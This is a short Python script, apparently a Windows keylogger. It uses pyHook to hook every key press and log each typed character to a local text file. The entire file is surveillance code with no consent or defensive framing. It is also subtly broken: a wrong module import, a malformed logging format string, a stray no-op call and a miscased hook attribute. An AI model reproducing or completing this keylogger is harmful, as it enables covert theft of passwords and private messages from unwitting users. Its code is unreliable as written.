import pyHook, python, sys, logging

file_log='c:\\important\\log.txt'

def OnKeyboardEvent(event):
	logging.basicConfig(filename=file_log,level=logging.DEBUG,format='%(message)')
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii))
	return True

hooks_manager=pyHook.HookManager()
hooks_manager.keyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
